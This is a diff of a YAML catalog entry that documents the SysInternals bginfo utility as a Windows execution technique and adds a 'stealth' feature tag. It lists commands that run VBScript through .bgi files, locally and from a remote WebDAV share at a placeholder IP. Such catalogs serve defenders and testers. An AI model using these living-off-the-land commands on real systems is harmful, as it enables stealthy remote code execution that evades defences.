@@ -2,7 +2,8 @@
 id: windows-execution-bginfo
 namespace: windows:execution:bginfo
 name: bginfo
-description: 'Background Information Utility included with SysInternals Suite Located at: no default.'
+description: 'Background Information Utility included with SysInternals Suite Located
+  at: no default.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -42,7 +43,11 @@ resource_profile:
 allowed-tools:
 - bginfo
 parameters: []
-features: []
+features:
+- file-system
+- pipes-stdin
+- pipes-stdout
+- stealth
 execution:
   template: bginfo
   sandbox: execFile
@@ -50,17 +55,21 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Execute VBscript code that is referenced within the specified .bgi file. (Local execution of VBScript)
+- description: Execute VBscript code that is referenced within the specified .bgi
+    file. (Local execution of VBScript)
   command: bginfo.exe {PATH:.bgi} /popup /nolicprompt
-- description: Execute VBscript code that is referenced within the specified .bgi file. (Local execution of VBScript)
+- description: Execute VBscript code that is referenced within the specified .bgi
+    file. (Local execution of VBScript)
   command: bginfo.exe {PATH:.bgi} /popup /nolicprompt
 - description: Execute bginfo.exe from a WebDAV server. (Remote execution of VBScript)
   command: \\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
 - description: Execute bginfo.exe from a WebDAV server. (Remote execution of VBScript)
   command: \\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
-- description: This style of execution may not longer work due to patch. (Remote execution of VBScript)
+- description: This style of execution may not longer work due to patch. (Remote execution
+    of VBScript)
   command: \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
-- description: This style of execution may not longer work due to patch. (Remote execution of VBScript)
+- description: This style of execution may not longer work due to patch. (Remote execution
+    of VBScript)
   command: \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
 references:
 - label: ''
@@ -85,7 +94,6 @@ install:
   commands:
   - choco install bginfo
 ---
-
 
 # bginfo
 
